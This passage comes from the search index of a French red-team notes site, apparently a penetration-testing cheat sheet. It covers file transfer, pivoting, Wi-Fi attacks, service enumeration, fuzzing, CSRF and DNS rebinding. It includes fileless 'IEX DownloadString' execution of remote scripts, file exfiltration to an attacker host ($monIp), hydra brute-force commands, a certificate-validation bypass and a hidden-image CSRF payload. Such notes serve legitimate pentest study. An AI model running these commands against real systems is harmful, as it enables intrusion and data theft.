https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20dans%20diff%C3%A9rents%20langages/#windows-via-creation-dun-fichier-wgetvbs-vbscript","title":"Windows, via cr\u00e9ation d'un fichier \"wget.vbs\" (VBScript)","text":"<pre><code>Contenu wget.vbs\ndim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", WScript.Arguments.Item(0), False\nxHttp.Send\n\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile WScript.Arguments.Item(1), 2\nend with\n\nPuis:\n\ncscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20depuis%20Windows/","title":"T\u00e9l\u00e9charger depuis Windows","text":""},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20depuis%20Windows/#envoie-de-fichier-en-base64","title":"Envoie de fichier en base64","text":"<pre><code>cat $fichier |base64 -w 0;echo\n</code></pre> <pre><code>[IO.File]::WriteAllBytes(\"C:\\Users\\Public\\$fichier\", [Convert]::FromBase64String(\"$base64\"))\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20depuis%20Windows/#telecharger-un-fichier-en-powershell","title":"T\u00e9l\u00e9charger un fichier en powershell","text":"<pre><code>(New-Object Net.WebClient).DownloadFileAsync('$url','$nomFichier')\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20depuis%20Windows/#telecharger-un-fichier-en-memoire-et-lexecuter-fileless","title":"T\u00e9l\u00e9charger un fichier en m\u00e9moire et l'ex\u00e9cuter (fileless)","text":"<pre><code>IEX (New-Object Net.WebClient).DownloadString('$Url_Script.ps1')\n\nou\n\n(New-Object Net.WebClient).DownloadString('$Url_Script.ps1') | IEX\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20depuis%20Windows/#telecharger-un-fichier-via-invoke-webrequest-ou-un-de-ses-alias-wget-curl-iwr","title":"T\u00e9l\u00e9charger un fichier via Invoke-WebRequest (ou un de ses Alias: wget, curl, iwr)","text":"<pre><code>Invoke-WebRequest $url -OutFile $nomFichier\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20depuis%20Windows/#bypasser-un-certificat-untrusted","title":"Bypasser un certificat untrusted","text":"<pre><code>[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20depuis%20Windows/#reception-dun-fichier-via-creation-dun-partage-smb","title":"R\u00e9ception d'un fichier via cr\u00e9ation d'un partage SMB","text":"<pre><code>sudo impacket-smbserver share -smb2support /tmp/smbshare -user t3st -password p4ssword\n</code></pre> <pre><code>net use n: \\\\$monip\\share /user:t3st p4ssword\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20depuis%20Windows/#reception-dun-fichier-via-creation-dun-serveur-ftp","title":"R\u00e9ception d'un fichier via cr\u00e9ation d'un serveur FTP","text":"<pre><code>sudo pip3 install pyftpdlib\nsudo python3 -m pyftpdlib --port 21\n</code></pre> <pre><code>(New-Object Net.WebClient).DownloadFile('ftp://$monIp/file.txt', 'ftp-file.txt')\n\nOu, en cas de shell non-interractif:\n\necho open $monIp &gt; ftpcommand.txt\necho USER anonymous &gt;&gt; ftpcommand.txt\necho binary &gt;&gt; ftpcommand.txt\necho GET file.txt &gt;&gt; ftpcommand.txt\necho bye &gt;&gt; ftpcommand.txt\nftp -v -n -s:ftpcommand.txt\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/Uploader%20depuis%20Windows/","title":"Uploader depuis Windows","text":""},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/Uploader%20depuis%20Windows/#upload-dun-fichier-depuis-windows-en-base64","title":"Upload d'un fichier depuis windows en base64","text":"<pre><code>[Convert]::ToBase64String((Get-Content -path \"$fichier\" -Encoding byte))\n</code></pre> <pre><code>echo $base64 | base64 -d &gt; $fichier\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/Uploader%20depuis%20Windows/#upload-dun-fichier-via-creation-dun-serveur-dupload","title":"Upload d'un fichier via cr\u00e9ation d'un serveur d'upload","text":"<pre><code>pip3 install uploadserver\npython3 -m uploadserver\n</code></pre> <pre><code>IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\n\nInvoke-FileUpload -Uri http://$monIp:8000/upload -File $fichier\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/Uploader%20depuis%20Windows/#upload-dun-fichier-en-base64-via-netcat","title":"Upload d'un fichier en base64 via netcat","text":"<pre><code>$b64 = [System.convert]::ToBase64String((Get-Content -Path '$fichier' -Encoding Byte))\nInvoke-WebRequest -Uri http://$monIp:8000/ -Method POST -Body $b64\n</code></pre> <pre><code>nc -lvnp 8000\necho $base64 | base64 -d -w 0 &gt; $fichier\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/Uploader%20depuis%20Windows/#upload-dun-fichier-via-creation-dun-serveur-ftp","title":"Upload d'un fichier via cr\u00e9ation d'un serveur FTP","text":"<pre><code>sudo python3 -m pyftpdlib --port 21 --write\n</code></pre> <pre><code>(New-Object Net.WebClient).UploadFile('ftp://$monIp/ftp-hosts', '$fichier')\n\nOu, en cas de shell non-interractif:\n\necho open $monIp &gt; ftpcommand.txt\necho USER anonymous &gt;&gt; ftpcommand.txt\necho binary &gt;&gt; ftpcommand.txt\necho PUT $fichier &gt;&gt; ftpcommand.txt\necho bye &gt;&gt; ftpcommand.txt\nftp -v -n -s:ftpcommand.txt\n</code></pre>"},{"location":"Red%20Team/R%C3%A9seau/D%C3%A9couverte%20d%27h%C3%B4tes/","title":"D\u00e9couverte d'h\u00f4tes","text":""},{"location":"Red%20Team/R%C3%A9seau/D%C3%A9couverte%20d%27h%C3%B4tes/#ping-sweep-linux","title":"Ping Sweep Linux","text":"<pre><code>for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep \"bytes from\" &amp;) ;done\n</code></pre>"},{"location":"Red%20Team/R%C3%A9seau/D%C3%A9couverte%20d%27h%C3%B4tes/#ping-sweep-windows","title":"Ping Sweep Windows","text":"<pre><code>for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i &gt; nul &amp;&amp; echo 192.168.1.%i is up.\n</code></pre>"},{"location":"Red%20Team/R%C3%A9seau/D%C3%A9couverte%20d%27h%C3%B4tes/#nmap","title":"Nmap","text":"<pre><code>nmap -sn 192.168.1.0/24\n</code></pre>"},{"location":"Red%20Team/R%C3%A9seau/Pivot%20via%20Ligolo-ng/","title":"Pivot via Ligolo ng","text":"<p>Ligolo-ng est un outil de post-exploitation offrant un proxy r\u00e9versible. Il est modulaire, permettant la personnalisation selon les besoins sp\u00e9cifiques. Con\u00e7u pour la furtivit\u00e9, il \u00e9chappe \u00e0 la d\u00e9tection et permet un contr\u00f4le \u00e0 distance des syst\u00e8mes compromis. Facile \u00e0 utiliser et compatible avec divers syst\u00e8mes, Ligolo-ng est un outil cl\u00e9 pour les tests de p\u00e9n\u00e9tration et les audits de s\u00e9curit\u00e9.</p>"},{"location":"Red%20Team/R%C3%A9seau/Pivot%20via%20Ligolo-ng/#mise-en-place","title":"Mise en place","text":"<pre><code>sudo ip tuntap add user $notreUser mode tun ligolo\n\nsudo ip link set ligolo up\n</code></pre> <pre><code>/home/pak/Tools/Ligolo/proxy --selfcert\n</code></pre>"},{"location":"Red%20Team/R%C3%A9seau/Pivot%20via%20Ligolo-ng/#transfert-sur-le-pivot","title":"Transfert sur le pivot","text":"<pre><code>scp /home/pak/Tools/Ligolo/agent user@ip:/home/user/Desktop/\n</code></pre>"},{"location":"Red%20Team/R%C3%A9seau/Pivot%20via%20Ligolo-ng/#sur-le-pivot","title":"Sur le pivot","text":"<pre><code>./agent --ignore-cert -connect ip:port\n</code></pre>"},{"location":"Red%20Team/R%C3%A9seau/Pivot%20via%20Ligolo-ng/#ouvrir-la-session-sur-notre-host-puis-rajouter-la-route","title":"Ouvrir la session sur notre host, puis rajouter la route","text":"<pre><code>sudo ip route add 192.168.0.0/24 dev ligolo\n</code></pre>"},{"location":"Red%20Team/R%C3%A9seau/Pivot%20via%20Ligolo-ng/#ajouter-une-redirection-de-port-pour-reverse-shell-etc","title":"Ajouter une redirection de port (pour reverse shell etc...)","text":"<pre><code>listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp\n</code></pre>"},{"location":"Red%20Team/R%C3%A9seau/Pivot%20via%20SSH/","title":"Pivot via SSH","text":"<p>Si la machine cible a acc\u00e8s \u00e0 un r\u00e9seau interne, il est possible de faire du port forwarding dynamique: tout le traffic passera par notre unique port local, et sera dispatch\u00e9 sur les diff\u00e9rents ports une fois la machine cible atteinte.</p> <p>Attention: cette technique ne permet de faire passer que des paquets TCP ! Aussi, les diff\u00e9rentes machines du r\u00e9seau interne n'ont pas forc\u00e9ment de routes permettant de communiquer en direct avec notre pc attaquant, ce qui va par exemple emp\u00eacher la mise en place de reverse shell.</p> <p>Dynamic port forwarding:</p> <pre><code>ssh -D 9050 ubuntu@10.129.202.64\n</code></pre> <p>Puis rajouter, dans le fichier /etc/proxychains.conf:</p> <pre><code>socks4  127.0.0.1 9050\n</code></pre> <p>les diff\u00e9rentes commandes doivent s'\u00e9x\u00e9cuter via proxychains, exemple:</p> <pre><code>proxychains nmap -v -sn 172.16.5.1-200\n</code></pre>"},{"location":"Red%20Team/R%C3%A9seau/Port%20forwarding%20via%20SSH/","title":"Port forwarding via SSH","text":"<p>Port forwarding local (le port distant 3306 sera accessible via le port local 1234):</p> <pre><code>ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64\n</code></pre> <p>Multiple port forwarding local:</p> <pre><code>ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64\n</code></pre>"},{"location":"Red%20Team/R%C3%A9seau/Wifi/Wifite/","title":"Wifite","text":"<p>Globalement, wifite va tenter toutes les attaques de base possibles sur un r\u00e9seau wifi:</p> <p>En cas de WEP: - Attaque r\u00e9cup\u00e9rant la clef WEP</p> <p>En cas de WPA: - Si il y a du WPS : Attaque \"Pixi Dust\" et bruteforce - Tentative pour r\u00e9cup\u00e9rer le PMKID et le cracker - Tentative de deauth des diff\u00e9rents clients pour r\u00e9cup\u00e9rer le handshake et le cracker</p> <pre><code>wifite -i wlan0\n</code></pre>"},{"location":"Red%20Team/Services/DNS/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"<p>Domain Name System, port 53, TCP/UDP R\u00e9solution des noms de domaines.</p> DNS Record Description A Adresse IPv4 du domaine. AAAA Adresse IPv6 du domaine. MX Serveur Mail du domaine. NS Serveur DNS du domaine. TXT Champs texte, peut contenir tout un tas d'informations. CNAME Alias: domaine secondaire qui pointera au m\u00eame endroit que le domaine principal. PTR Convertit un domaine en adresse IP (sens inverse, donc). SOA Contient des informations sur la zone DNS."},{"location":"Red%20Team/Services/DNS/G%C3%A9n%C3%A9ralit%C3%A9s/#enumeration","title":"Enum\u00e9ration","text":""},{"location":"Red%20Team/Services/DNS/G%C3%A9n%C3%A9ralit%C3%A9s/#savoir-quels-autres-serveurs-dns-sont-presents","title":"Savoir quels autres serveurs DNS sont pr\u00e9sents:","text":"<pre><code>dig ns $domain @$ip\n</code></pre>"},{"location":"Red%20Team/Services/DNS/G%C3%A9n%C3%A9ralit%C3%A9s/#zone-transfer","title":"Zone Transfer:","text":"<p>Permet \u00e0 un serveur DNS de transf\u00e9rer sa zone \u00e0 un autre serveur DNS en cas de probl\u00e8me. En cas de mauvaise configuration il est possible pour nous aussi de faire une demande de transfert et de r\u00e9cup\u00e9rer les information:</p> <pre><code>dig axfr $domain @$ip\n</code></pre>"},{"location":"Red%20Team/Services/DNS/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force","title":"Brute force","text":""},{"location":"Red%20Team/Services/DNS/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force-des-subdomains","title":"Brute-force des subdomains:","text":"<pre><code>dnsenum --dnsserver $ip --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt $domain\n</code></pre>"},{"location":"Red%20Team/Services/DNS/G%C3%A9n%C3%A9ralit%C3%A9s/#metasploit","title":"Metasploit","text":"<pre><code>auxiliary/gather/enum_dns\n</code></pre>"},{"location":"Red%20Team/Services/DNS/G%C3%A9n%C3%A9ralit%C3%A9s/#configuration-potentiellement-dangereuse","title":"Configuration potentiellement dangereuse","text":"Option Description allow-query Defines which hosts are allowed to send requests to the DNS server. allow-recursion Defines which hosts are allowed to send recursive requests to the DNS server. allow-transfer Defines which hosts are allowed to receive zone transfers from the DNS server. zone-statistics Collects statistical data of zones."},{"location":"Red%20Team/Services/FTP/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"<p>File Transfer Protocol, port 21, TCP Transfert de fichier, non s\u00e9curis\u00e9 contrairement \u00e0 ses diff\u00e9rentes variantes (sFTP, etc), les donn\u00e9es sont transmises en clair.</p>"},{"location":"Red%20Team/Services/FTP/G%C3%A9n%C3%A9ralit%C3%A9s/#enumeration","title":"Enumeration","text":""},{"location":"Red%20Team/Services/FTP/G%C3%A9n%C3%A9ralit%C3%A9s/#nmap","title":"Nmap:","text":"<pre><code>nmap -A --script ftp* -p 21 $ip\n</code></pre>"},{"location":"Red%20Team/Services/FTP/G%C3%A9n%C3%A9ralit%C3%A9s/#connection-via-netcat","title":"connection via netcat :","text":"<pre><code>nc -nv $ip 21\n</code></pre>"},{"location":"Red%20Team/Services/FTP/G%C3%A9n%C3%A9ralit%C3%A9s/#connection-avec-openssl-si-le-serveur-utilise-ssltls","title":"Connection avec openssl (si le serveur utilise SSL/TLS):","text":"<pre><code>openssl s_client -connect $ip:21 -starttls ftp\n</code></pre>"},{"location":"Red%20Team/Services/FTP/G%C3%A9n%C3%A9ralit%C3%A9s/#bruteforce","title":"Bruteforce","text":""},{"location":"Red%20Team/Services/FTP/G%C3%A9n%C3%A9ralit%C3%A9s/#bruteforce-user","title":"Bruteforce user :","text":"<pre><code>hydra -L /usr/list/user.txt -p password1234 $ip ftp\n</code></pre>"},{"location":"Red%20Team/Services/FTP/G%C3%A9n%C3%A9ralit%C3%A9s/#bruteforce-password","title":"Bruteforce password :","text":"<pre><code>hydra -l user -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt $ip ftp\n</code></pre>"},{"location":"Red%20Team/Services/FTP/G%C3%A9n%C3%A9ralit%C3%A9s/#configuration-potentiellement-dangereuse","title":"Configuration potentiellement dangereuse","text":""},{"location":"Red%20Team/Services/FTP/G%C3%A9n%C3%A9ralit%C3%A9s/#-vsftpd","title":"- VSFTPd","text":"Settings Descriptions anonymous_enable=YES Permet l'identification en Anonymous anon_upload_enable=YES Permet \u00e0 l'utilisateur Anonymous d'uploader anon_mkdir_write_enable=YES Permet \u00e0 l'utilisateur Anonymous de cr\u00e9er un dossier no_anon_password=YES Ne pas demander de password \u00e0 l'utilisateur Anonymous anon_root=/home/username/ftp Le r\u00e9pertoire de l'utilisateur Anonymous write_enable=YES Autorise l'usage des commandes: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?"},{"location":"Red%20Team/Services/HTTP/Enum%C3%A9ration%20g%C3%A9n%C3%A9rale/","title":"Enum\u00e9ration g\u00e9n\u00e9rale","text":""},{"location":"Red%20Team/Services/HTTP/Enum%C3%A9ration%20g%C3%A9n%C3%A9rale/#informations-sur-le-serveur-utilise-les-technologies-php-js-le-cms","title":"Informations sur le serveur utilis\u00e9, les technologies (php, js...), le CMS... :","text":"<pre><code>whatweb -a3 https://$domain -v\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Enum%C3%A9ration%20g%C3%A9n%C3%A9rale/#recuperer-le-header-http","title":"R\u00e9cup\u00e9rer le HEADER HTTP :","text":"<pre><code>curl -I \"http://$domain\"\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Enum%C3%A9ration%20g%C3%A9n%C3%A9rale/#savoir-si-il-y-a-un-firewall-applicatif-web-waf","title":"Savoir si il y a un firewall applicatif web (WAF) :","text":"<pre><code>wafw00f -v https://www.tesla.com\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Enum%C3%A9ration%20g%C3%A9n%C3%A9rale/#fuzzing","title":"Fuzzing","text":""},{"location":"Red%20Team/Services/HTTP/Enum%C3%A9ration%20g%C3%A9n%C3%A9rale/#repertoires","title":"R\u00e9pertoires :","text":"<pre><code>gobuster dir -u http://domain.com -w /usr/share/wordlist/dirb/big.txt\n---\nferoxbuster http://domain.com\n---\nffuf -w /usr/share/wordlist/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Enum%C3%A9ration%20g%C3%A9n%C3%A9rale/#fuzzing-extensions","title":"Fuzzing extensions :","text":"<pre><code>ffuf -w /usr/share/wordlist/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Enum%C3%A9ration%20g%C3%A9n%C3%A9rale/#fuzzing-de-pages-web","title":"Fuzzing de pages web :","text":"<pre><code>ffuf -w /usr/share/wordlist/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Enum%C3%A9ration%20g%C3%A9n%C3%A9rale/#fuzzing-recursif-ici-recursivite-sur-un-niveau-et-tentes-de-trouver-des-fichiers-php","title":"Fuzzing r\u00e9cursif (ici r\u00e9cursivit\u00e9 sur un niveau, et tentes de trouver des fichiers .php) :","text":"<pre><code>ffuf -w /usr/share/wordlist/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Enum%C3%A9ration%20g%C3%A9n%C3%A9rale/#fuzzing-lfi","title":"Fuzzing LFI :","text":"<pre><code>ffuf -w /usr/share/wordlist/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Enum%C3%A9ration%20g%C3%A9n%C3%A9rale/#fuzzing-parametres","title":"Fuzzing param\u00e8tres :","text":"<pre><code>ffuf -w /usr/share/wordlist/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Reconnaissance%20de%20domaine/","title":"Reconnaissance de domaine","text":""},{"location":"Red%20Team/Services/HTTP/Reconnaissance%20de%20domaine/#certificats","title":"Certificats","text":""},{"location":"Red%20Team/Services/HTTP/Reconnaissance%20de%20domaine/#informations-certificat","title":"Informations certificat:","text":"<pre><code>export TARGET=\"facebook.com\"\ncurl -s \"https://crt.sh/?q=${TARGET}&amp;output=json\" | jq -r '.[] | \"\\(.name_value)\\n\\(.common_name)\"' | sort -u &gt; \"${TARGET}_crt.sh.txt\"\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Reconnaissance%20de%20domaine/#subdomains","title":"Subdomains","text":""},{"location":"Red%20Team/Services/HTTP/Reconnaissance%20de%20domaine/#utiliser-harvester-pour-trouver-des-subdomains-sur-differents-moteurs-de-recherche","title":"Utiliser harvester pour trouver des subdomains sur diff\u00e9rents moteurs de recherche:","text":"<pre><code>export TARGET=\"facebook.com\"\ncat sources.txt | while read source; do theHarvester -d \"${TARGET}\" -b $source -f \"${source}_${TARGET}\";done\n\nsources.txt:\nbaidu\nbufferoverun\ncrtsh\nhackertarget\notx\nprojecdiscovery\nrapiddns\nsublist3r\nthreatcrowd\ntrello\nurlscan\nvhost\nvirustotal\nzoomeye\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Reconnaissance%20de%20domaine/#brute-force-dns-avec-gobuster","title":"Brute force DNS avec gobuster:","text":"<pre><code>export TARGET=\"facebook.com\"\nexport NS=\"d.ns.facebook.com\"\nexport WORDLIST=\"numbers.txt\"\ngobuster dns -q -r \"${NS}\" -d \"${TARGET}\" -w \"${WORDLIST}\" -p ./patterns.txt -o \"gobuster_${TARGET}.txt\"\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Reconnaissance%20de%20domaine/#fuzzing-vhost-remplacer-la-valeur-de-fs-par-la-taille-dun-faux-positif","title":"Fuzzing vHost (remplacer la valeur de \"fs\" par la taille d'un faux positif):","text":"<pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://$ip -H \"HOST: FUZZ.$domain\" -fs 10918\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Verb%20Tampering/","title":"Verb Tampering","text":"Cat\u00e9gorie Information TTP Modification ou abus des m\u00e9thodes (verbes) HTTP CWE CWE-275 (Permission Issues) Description de l'attaque HTTP Verb Tampering implique l'exploitation de la gestion inad\u00e9quate des m\u00e9thodes HTTP (comme GET, POST, DELETE) par une application web. Cela peut permettre \u00e0 un attaquant d'acc\u00e9der \u00e0 des fonctionnalit\u00e9s non autoris\u00e9es ou de contourner les contr\u00f4les de s\u00e9curit\u00e9. Impacts potentiels - Acc\u00e8s ou modification non autoris\u00e9e des donn\u00e9es- Bypass des restrictions d'acc\u00e8s- Ex\u00e9cution d'actions non autoris\u00e9es Comment la d\u00e9tecter - Analyse de s\u00e9curit\u00e9 des configurations de serveur web- Tests de p\u00e9n\u00e9tration ciblant la gestion des m\u00e9thodes HTTP- Revue de code pour la gestion des m\u00e9thodes HTTP Rem\u00e9diations/mitigations - Restriction et s\u00e9curisation de l'utilisation des m\u00e9thodes HTTP dans les applications web- Impl\u00e9mentation de contr\u00f4les d'acc\u00e8s et de validation appropri\u00e9s pour chaque m\u00e9thode HTTP- Utilisation de pare-feux d'applications web (WAF) pour filtrer les requ\u00eates malveillantes Lien de r\u00e9f\u00e9rence OWASP - Testing for HTTP Verb Tampering"},{"location":"Red%20Team/Services/HTTP/CSRF/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/Services/HTTP/CSRF/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Le Cross-Site Request Forgery (CSRF) est une vuln\u00e9rabilit\u00e9 web qui permet \u00e0 un attaquant de faire effectuer des actions ind\u00e9sirables \u00e0 un utilisateur authentifi\u00e9 sur une application web, sans que cet utilisateur en soit conscient. Les actions sont ex\u00e9cut\u00e9es avec les privil\u00e8ges de l'utilisateur authentifi\u00e9, ce qui peut entra\u00eener des cons\u00e9quences graves, telles que des modifications non autoris\u00e9es de donn\u00e9es ou des actions non intentionnelles sur l'application cible.</p>"},{"location":"Red%20Team/Services/HTTP/CSRF/G%C3%A9n%C3%A9ralit%C3%A9s/#exemple-dattaque-csrf","title":"Exemple d'Attaque CSRF","text":"<p>Sc\u00e9nario d'attaque :</p> <ul> <li>Un utilisateur est authentifi\u00e9 sur un site web (par exemple, <code>https://example.com</code>).</li> <li>L'attaquant envoie un lien ou une image malveillante \u00e0 l'utilisateur, souvent via email ou un autre site web.</li> <li>Lorsque l'utilisateur clique sur le lien ou visite la page contenant l'image malveillante, une requ\u00eate est envoy\u00e9e au site web sur lequel il est authentifi\u00e9.</li> </ul> <p>Exemple de code malveillant :</p> <pre><code>&lt;!-- Exemple d'image HTML --&gt;\n&lt;img src=\"https://example.com/transfer?amount=1000&amp;to=attacker_account\" style=\"display:none\"&gt;\n</code></pre> <p>Ce code envoie une requ\u00eate GET \u00e0 <code>https://example.com/transfer</code> avec les param\u00e8tres sp\u00e9cifi\u00e9s, ex\u00e9cutant ainsi une action de transfert d'argent sans le consentement de l'utilisateur.</p>"},{"location":"Red%20Team/Services/HTTP/CSRF/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-csrf","title":"Pr\u00e9vention des Attaques CSRF","text":"<p>Utilisation de Tokens CSRF :</p> <ul> <li>Impl\u00e9menter des tokens CSRF dans les formulaires et les requ\u00eates sensibles. Ces tokens doivent \u00eatre uniques pour chaque session utilisateur et v\u00e9rifi\u00e9s par le serveur avant d'ex\u00e9cuter des actions sensibles.</li> </ul> <pre><code>&lt;form action=\"/transfer\" method=\"post\"&gt; &lt;input type=\"hidden\" name=\"csrf_token\" value=\"unique_csrf_token\"&gt; Montant: &lt;input type=\"text\" name=\"amount\"&gt; Compte: &lt;input type=\"text\" name=\"to_account\"&gt; &lt;input type=\"submit\" value=\"Transf\u00e9rer\"&gt; &lt;/form&gt;\n</code></pre> <p>V\u00e9rification des En-t\u00eates de R\u00e9f\u00e9rents :</p> <ul> <li>V\u00e9rifier l'en-t\u00eate HTTP Referer pour s'assurer que la requ\u00eate provient d'une page l\u00e9gitime de votre domaine.</li> </ul> <pre><code>if (isset($_SERVER['HTTP_REFERER']) &amp;&amp; parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) === 'example.com') { // Requ\u00eate l\u00e9gitime } else { // Requ\u00eate potentiellement malveillante }\n</code></pre> <p>Utilisation de M\u00e9thodes HTTP Appropri\u00e9es :  - Restreindre les actions sensibles aux m\u00e9thodes POST, PUT, DELETE, etc., plut\u00f4t que GET. Les requ\u00eates GET ne doivent pas modifier l'\u00e9tat du serveur.</p> <p>D\u00e9tection et Annulation des Sessions Doubles :</p> <ul> <li>D\u00e9tecter les sessions doubles et les annuler, ou exiger une r\u00e9-authentification pour les actions sensibles.</li> </ul>"},{"location":"Red%20Team/Services/HTTP/CSRF/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-csrf","title":"D\u00e9tection des Failles CSRF","text":"<p>Revue de Code :</p> <ul> <li>Analyser le code source de l'application pour v\u00e9rifier l'absence de protection CSRF sur les formulaires et les requ\u00eates sensibles.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Cr\u00e9er des requ\u00eates malveillantes similaires \u00e0 celles d\u00e9crites dans l'exemple et les ex\u00e9cuter pour voir si l'application est vuln\u00e9rable.</li> </ul> <p>Utilisation d'Outils d'Analyse :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 web automatis\u00e9s qui incluent des tests de CSRF, tels que OWASP ZAP ou Burp Suite.</li> </ul> Cat\u00e9gorie Information TTP Induire les utilisateurs \u00e0 effectuer des actions non d\u00e9sir\u00e9es sur un site Web o\u00f9 ils sont authentifi\u00e9s CWE CWE-352 (Cross-Site Request Forgery (CSRF)) Description de l'attaque CSRF exploite la confiance qu'un site web a envers le navigateur de l'utilisateur. L'attaque force l'utilisateur \u00e0 ex\u00e9cuter des actions non d\u00e9sir\u00e9es sur un site web o\u00f9 il est authentifi\u00e9, typiquement via un lien malveillant ou un script dans une autre page. Impacts potentiels - Actions non autoris\u00e9es effectu\u00e9es au nom de l'utilisateur- Modification de param\u00e8tres de compte- Potentiel de transactions malveillantes Comment la d\u00e9tecter - Analyse de code pour les formulaires et requ\u00eates sans jetons de validation CSRF- Tests de p\u00e9n\u00e9tration pour identifier les vuln\u00e9rabilit\u00e9s CSRF- Surveillance des journaux de serveur web pour des mod\u00e8les de requ\u00eate inhabituels Rem\u00e9diations/mitigations - Utilisation de jetons anti-CSRF dans les formulaires- V\u00e9rification de l'origine des requ\u00eates avec des ent\u00eates HTTP appropri\u00e9s- Mise en \u0153uvre de politiques de s\u00e9curit\u00e9 de contenu strictes- Sensibilisation des utilisateurs aux liens et aux pi\u00e8ces jointes suspectes Lien de r\u00e9f\u00e9rence OWASP - Cross-Site Request Forgery (CSRF)"},{"location":"Red%20Team/Services/HTTP/DNS%20rebinding/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/Services/HTTP/DNS%20rebinding/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Le DNS Rebinding est une vuln\u00e9rabilit\u00e9 qui permet \u00e0 un attaquant de contourner les politiques de s\u00e9curit\u00e9 de m\u00eame origine (Same-Origin Policy) et de prendre le contr\u00f4le d'un navigateur web pour communiquer avec des syst\u00e8mes prot\u00e9g\u00e9s sur le r\u00e9seau local de l'utilisateur. Cette attaque exploite le m\u00e9canisme de r\u00e9solution DNS pour manipuler l'adresse IP r\u00e9solue pour un nom de domaine, permettant \u00e0 l'attaquant de rediriger le trafic vers une adresse IP diff\u00e9rente, souvent celle du r\u00e9seau local de la victime.</p>"},{"location":"Red%20Team/Services/HTTP/DNS%20rebinding/G%C3%A9n%C3%A9ralit%C3%A9s/#exemple-dattaque-dns-rebinding","title":"Exemple d'Attaque 